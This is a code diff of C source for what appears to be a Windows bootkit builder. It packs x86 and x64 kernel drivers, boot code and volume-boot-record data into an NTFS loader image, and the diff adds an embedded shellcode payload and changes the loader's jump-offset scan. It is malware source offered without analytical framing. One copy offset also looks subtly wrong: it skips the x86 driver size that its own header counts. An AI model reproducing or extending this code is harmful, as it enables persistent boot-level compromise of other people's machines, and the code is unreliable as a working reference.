@@ -2,26 +2,45 @@
 
 static ULONG __stdcall GetCodeOffset(PUCHAR pLoader)
 {
-	ULONG uli;
+	ULONG ulOffset;
+	ULONG ulCount;
 
-	uli = NTFS_LDR_HEADER_SIZE;
-
+	ulOffset = NTFS_LDR_HEADER_SIZE;
+	ulCount = NTFS_LDR_HEADER_SIZE;
 	// Skipping zeroes
-	while (uli < BIOS_DEFAULT_SECTOR_SIZE/* && (pLoader[uli] == 0)*/)
+	while (ulCount <= BIOS_DEFAULT_SECTOR_SIZE/*uli < BIOS_DEFAULT_SECTOR_SIZE && (pLoader[uli] == 0)*/)
 	{
-		if (pLoader[uli] == OP_JMP_SHORT)
+		if (pLoader[ulCount] == OP_JMP_SHORT)
 		{
-			uli += pLoader[uli + 1] + 2;
-			break;
+			ulOffset = ulCount;
+			ulOffset += pLoader[ulCount + 1] + 2;
+			if (ulOffset > BIOS_DEFAULT_SECTOR_SIZE)
+			{
+				ulCount++;
+				continue;
+			}
+			else
+			{
+				break;
+			}
 		}
-		if (pLoader[uli] == OP_JMP_NEAR)
+		if (pLoader[ulCount] == OP_JMP_NEAR)
 		{
-			uli += *(PUSHORT)&pLoader[uli + 1] + 3;
-			break;
+			ulOffset = ulCount;
+			ulOffset += *(PUSHORT)&pLoader[ulCount + 1] + 3;
+			if (ulOffset > BIOS_DEFAULT_SECTOR_SIZE)
+			{
+				ulCount++;
+				continue;
+			}
+			else
+			{
+				break;
+			}
 		}
-		uli += 1;
+		ulCount += 1;
 	}
-	return uli;
+	return ulOffset;
 }
 ULONG __stdcall ApPack(PCHAR SrcBuffer,ULONG SrcLen,PCHAR* pDstBuffer)
 {
@@ -173,6 +192,9 @@ int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PCHAR pCmdLine,
 	ULONG uli;
 	ULONG ulXored;
 	ULONG ulOffset;
+	PCHAR pShellCode;
+	ULONG ulShellCodeSize;
+	LDRDRV ShellCodeDrv;
 	CHAR ShowMsgA[MAX_PATH];
 
 	pVbrDat = NULL;
@@ -192,19 +214,22 @@ int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PCHAR pCmdLine,
 	ulOffset = 0;
 	pPacked = NULL;
 	ulPackedSize = 0;
+	ulShellCodeSize = 0;
+	pShellCode = NULL;
 	RtlZeroMemory(ShowMsgA,sizeof(CHAR) * MAX_PATH);
 
 
 	switch (__argc)
 	{
-	case 6:
+	case 7:
 		if (GetFileDat(__argv[4],&pInjectX86Sys,&ulX86SysSize) && \
-			GetFileDat(__argv[5],&pInjectX64Sys,&ulX64SysSize))
+			GetFileDat(__argv[5],&pInjectX64Sys,&ulX64SysSize) && \
+			GetFileDat(__argv[6],&pShellCode,&ulShellCodeSize))
 		{
-			ulTotalSize = sizeof(LDRDRV) * 3 + ulX86SysSize + ulX64SysSize;
-			if (ulTotalSize % 0x200)
+			ulTotalSize = sizeof(LDRDRV) * 4 + ulX86SysSize + ulX64SysSize + ulShellCodeSize;
+			if (ulTotalSize % 0x400)
 			{
-				ulTotalSize = ((ulTotalSize / 0x200) + 1) * 0x200;
+				ulTotalSize = ((ulTotalSize / 0x400) + 1) * 0x400;
 			}
 			do 
 			{
@@ -214,17 +239,26 @@ int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PCHAR pCmdLine,
 
 			x86LdrDrv.ulSignature = 'XD86';
 			x86LdrDrv.ulLength = ulX86SysSize;
-			x86LdrDrv.ulOffset = sizeof(x86LdrDrv) * 3;
+			x86LdrDrv.ulOffset = sizeof(x86LdrDrv) * 4;
 			x86LdrDrv.ulXor = 0;
 
 			x64LdrDrv.ulSignature = 'XD64';
 			x64LdrDrv.ulLength = ulX64SysSize;
-			x64LdrDrv.ulOffset = sizeof(LDRDRV) * 3 + ulX86SysSize;
+			x64LdrDrv.ulOffset = sizeof(LDRDRV) * 4 + ulX86SysSize;
 			x64LdrDrv.ulXor = 0;
+
+			ShellCodeDrv.ulSignature = 'XDSD';
+			ShellCodeDrv.ulLength = ulShellCodeSize;
+			ShellCodeDrv.ulOffset = sizeof(LDRDRV) * 4 + ulX86SysSize + ulX64SysSize;
+			ShellCodeDrv.ulXor = 0;
+
 			RtlCopyMemory(pSysDat,&x86LdrDrv,sizeof(LDRDRV));
 			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV)),&x64LdrDrv,sizeof(LDRDRV));
-			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 3),pInjectX86Sys,ulX86SysSize);
-			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 3 + ulX86SysSize),pInjectX64Sys,ulX64SysSize);
+			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 2),&ShellCodeDrv,sizeof(LDRDRV));
+
+			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 4),pInjectX86Sys,ulX86SysSize);
+			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 4 + ulX86SysSize),pInjectX64Sys,ulX64SysSize);
+			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 4 + ulX64SysSize),pShellCode,ulShellCodeSize);
 
 		}
 		if (GetFileDat(__argv[2],&pBootCode,&ulBootCodeSize))
